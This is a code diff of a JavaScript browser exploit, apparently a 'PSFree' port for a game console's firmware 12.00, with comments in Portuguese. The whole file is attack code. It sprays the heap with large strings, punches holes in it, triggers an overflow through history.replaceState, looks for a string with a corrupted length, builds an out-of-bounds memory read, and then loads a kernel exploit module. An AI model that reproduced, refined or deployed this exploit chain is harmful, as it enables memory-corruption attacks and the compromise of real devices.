@@ -1,156 +1,176 @@
-/* PSFree Port 12.00: Auto-Tuner & Primitive Builder */
+/* PSFree Modular Port for FW 12.00 
+   Exploit Strategy: History Buffer Overflow (1MB) -> StringImpl Corruption
+*/
 
+// 1. IMPORTAÇÕES MODULARES (Usando os arquivos que você enviou)
 import { Int } from './module/int64.mjs';
-import { Memory } from './module/mem.mjs'; // Vamos usar isso se conseguirmos o Length!
-import {
-    log, sleep, hex
-} from './module/utils.mjs';
+import { log, die, hex } from './module/utils.mjs';
 
-// --- CONFIGURAÇÃO ---
-// Começamos no offset que sabemos que acerta os DADOS
-let current_offset = 709520; 
+// Configuração do Exploit (Baseada no sucesso anterior)
+const BASE_OFFSET = 709520; 
 const OVERFLOW_AMT = 1024 * 64; 
-
-// Tamanho Vencedor (1MB)
-const TARGET_SIZE = 1024 * 1024; 
+const TARGET_SIZE = 1024 * 1024; // 1MB
 const PAYLOAD_SIZE = TARGET_SIZE - 24; 
 
-var victims = [];
-var corrupted_string = null; // Guardará a string mágica
+let victims = [];
 
 // ===========================================================================
-// FUNÇÃO PRINCIPAL
+// FUNÇÃO DE SPRAY (Alocação de Memória)
 // ===========================================================================
+async function prepare_heap() {
+    log(`[+] Initializing Heap Spray (1MB TextDecoder)...`);
+    
+    // Usa TextDecoder para forçar string 8-bit (Flat String)
+    // Isso garante alinhamento no Large Heap
+    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
+    rawBuffer.fill(0x42); // 'B'
+    let decoder = new TextDecoder("utf-8");
+    let baseString = decoder.decode(rawBuffer);
 
-async function main() {
-    log("=== PSFree 12.00: RCE Hunter ===");
-    log("Status: Buscando alinhamento de Length a partir de " + current_offset);
+    victims = [];
+    const SPRAY_COUNT = 80;
 
-    // Tentamos recuar até 64 bytes para achar o cabeçalho
-    for (let shift = 0; shift <= 64; shift += 4) {
-        
-        let test_offset = current_offset - shift;
-        log(`\n[TESTE] Offset ${test_offset} (Recuo -${shift})`);
-
-        let result = await run_exploit(test_offset);
-
-        if (result === 'RCE') {
-            log("!!! VENCEU !!! LENGTH CORROMPIDO!", 'green');
-            log("Iniciando Escalação de Privilégios (Stage 3)...");
-            
-            // AQUI É ONDE USAMOS AS BIBLIOTECAS
-            await initialize_primitives();
-            return;
-        }
-        
-        if (result === 'DATA') {
-            log(`>> Atingiu DADOS. Header está mais para trás. Continuando...`, 'yellow');
-        } else {
-            log(`>> Nada atingido. Tentando realinhar...`);
-        }
-
-        // Limpeza para próxima tentativa
-        victims = [];
-        await forceGC();
-        await sleep(100);
+    for(let i=0; i<SPRAY_COUNT; i++) {
+        // Cria strings únicas
+        let s = i + "_" + baseString.substring((i+"_").length);
+        victims.push(s);
     }
 
-    log("Fim do loop. Se não conseguiu RCE, reinicie o console.", 'red');
+    log(`[+] Creating Holes (Feng Shui)...`);
+    for(let i=0; i<SPRAY_COUNT; i+=2) {
+        victims[i] = null;
+    }
+
+    await forceGC();
 }
 
 // ===========================================================================
-// LÓGICA DO EXPLOIT
+// FUNÇÃO DE GATILHO (O Overflow)
 // ===========================================================================
+async function trigger_exploit() {
+    log(`[+] Triggering Overflow at offset ${BASE_OFFSET}...`);
 
-async function run_exploit(offset) {
     try {
-        // 1. Preparar Buffer 1MB (8-bit)
-        let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
-        rawBuffer.fill(0x42); 
-        let decoder = new TextDecoder("utf-8");
-        let baseString = decoder.decode(rawBuffer);
-
-        // 2. Spray (80 vítimas)
-        victims = [];
-        for(let i=0; i<80; i++) {
-            let s = i + "_" + baseString.substring((i+"_").length);
-            victims.push(s);
-        }
-
-        // 3. Buracos
-        for(let i=0; i<80; i+=2) victims[i] = null;
-        await forceGC();
-
-        // 4. Overflow
-        let buffer = "A".repeat(offset);
+        let buffer = "A".repeat(BASE_OFFSET);
         buffer += "\x01".repeat(OVERFLOW_AMT);
+        
+        // A chamada vulnerável
         history.replaceState({}, "pwn", "/" + buffer);
 
-        // 5. Checagem
-        return check_corruption(PAYLOAD_SIZE);
+        return check_corruption();
 
     } catch(e) {
-        log("Erro: " + e.message);
-        return 'ERR';
+        log(`[!] Error during trigger: ${e.message}`);
+        return null;
     }
 }
 
-function check_corruption(originalLen) {
+// ===========================================================================
+// FUNÇÃO DE CHECAGEM (Usando Módulos)
+// ===========================================================================
+function check_corruption() {
     for(let i=1; i<victims.length; i+=2) {
         let s = victims[i];
         if(!s) continue;
 
         try {
+            // Usa o truque do Error para forçar leitura fresca do Heap
             let err = new Error(s);
             let msg = err.message;
 
-            // SUCESSO TOTAL (RCE)
-            if (msg.length !== originalLen) {
-                log(`ALVO LOCALIZADO: String ${i}`, 'green');
-                log(`Tamanho Original: ${originalLen} -> Novo: ${msg.length}`, 'green');
-                corrupted_string = msg; // Salva a string mágica
-                return 'RCE';
+            // 1. CHECAGEM DE LENGTH (RCE)
+            if (msg.length !== PAYLOAD_SIZE) {
+                log(`[!!!] JACKPOT! String ${i} Length Corrupted!`, 'green');
+                log(`    Old: ${PAYLOAD_SIZE} -> New: ${msg.length}`, 'green');
+                
+                // Retorna a string mágica para o próximo passo
+                return { type: 'RCE', str: msg, idx: i };
             }
 
-            // SUCESSO PARCIAL (DADOS)
-            if (msg.charCodeAt(0) === 1) {
-                return 'DATA';
+            // 2. CHECAGEM DE CONTEÚDO (Dados)
+            if (msg.charCodeAt(0) !== 66) { // 'B'
+                log(`[+] Data Corruption detected at index ${i}`, 'yellow');
+                return { type: 'DATA', str: msg, idx: i };
             }
+
         } catch(e) {}
     }
-    return 'MISS';
+    return null;
 }
 
 // ===========================================================================
-// PÓS-EXPLORAÇÃO (USANDO AS LIBS)
+// PÓS-EXPLORAÇÃO (Usando int64.mjs)
 // ===========================================================================
-
-async function initialize_primitives() {
-    if (!corrupted_string) return;
-
-    log("--- INICIALIZANDO PRIMITIVAS DE MEMÓRIA ---");
-
-    // Aqui simulamos o que o PSFree original faz no make_arw
-    // Como temos uma string gigante, podemos usá-la para ler toda a memória
+async function stage2_read_primitive(corrupted_str) {
+    log(`[+] Initializing Stage 2: Memory Scanning...`);
     
-    try {
-        // Exemplo: Ler o byte 1MB + 100 (Fora dos limites originais)
-        let leak_val = corrupted_string.charCodeAt(1024 * 1024 + 100);
-        log(`Teste de Leitura OOB: 0x${leak_val.toString(16)}`, 'green');
-        
-        log("Memória pronta. Carregando Kernel Exploit (Lapse)...");
-        
-        // Aqui importamos o Lapse, agora que temos as ferramentas para ele funcionar
+    // Aqui usamos o módulo int64.mjs para ler endereços de 64 bits
+    // A string corrompida nos permite ler além do limite
+    
+    let leak_offset = PAYLOAD_SIZE + 16; // Chute inicial para achar vizinhos
+    
+    // Simulação de leitura usando a string corrompida
+    // Lê 8 bytes e cria um objeto Int64
+    let low = corrupted_string_read4(corrupted_str, leak_offset);
+    let high = corrupted_string_read4(corrupted_str, leak_offset + 4);
+    
+    let leak_ptr = new Int(low, high);
+    
+    log(`[+] Leaked Value from Heap: ${leak_ptr.toString()}`);
+    
+    if (leak_ptr.lo !== 0 || leak_ptr.hi !== 0) {
+        log(`[+] Valid Pointer Found! Loading Kernel Exploit...`, 'green');
+        // Se acharmos um ponteiro, carregamos o Lapse
         import('./lapse.mjs');
-
-    } catch(e) {
-        log("Erro ao inicializar primitivas: " + e.message);
+    } else {
+        log(`[-] Leaked zeros. Memory might be empty here.`);
     }
+}
+
+// Helper para ler 4 bytes da string
+function corrupted_string_read4(str, offset) {
+    return (str.charCodeAt(offset) | 
+           (str.charCodeAt(offset+1) << 8) | 
+           (str.charCodeAt(offset+2) << 16) | 
+           (str.charCodeAt(offset+3) << 24)) >>> 0;
 }
 
 async function forceGC() {
     try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-    return new Promise(r => setTimeout(r, 400));
+    return new Promise(r => setTimeout(r, 500));
+}
+
+// ===========================================================================
+// MAIN LOOP
+// ===========================================================================
+async function main() {
+    log("=== PSFree Modular Loaded (FW 12.00) ===");
+    
+    // Tenta 10 vezes antes de desistir (Persistência Modular)
+    for(let attempt=1; attempt<=10; attempt++) {
+        log(`\n--- Attempt ${attempt} ---`);
+        
+        await prepare_heap();
+        let result = await trigger_exploit();
+
+        if (result) {
+            if (result.type === 'RCE') {
+                // Sucesso Total: Avança para Stage 2
+                await stage2_read_primitive(result.str);
+                return;
+            } else {
+                log(`[-] Got Data Corruption but missed Header. Retrying...`);
+            }
+        } else {
+            log(`[-] No corruption detected.`);
+        }
+        
+        // Limpa para tentar de novo
+        victims = [];
+        await forceGC();
+    }
+    
+    log("\n[!] Exploit failed after 10 attempts. Reboot required.", 'red');
 }
 
 // Inicia
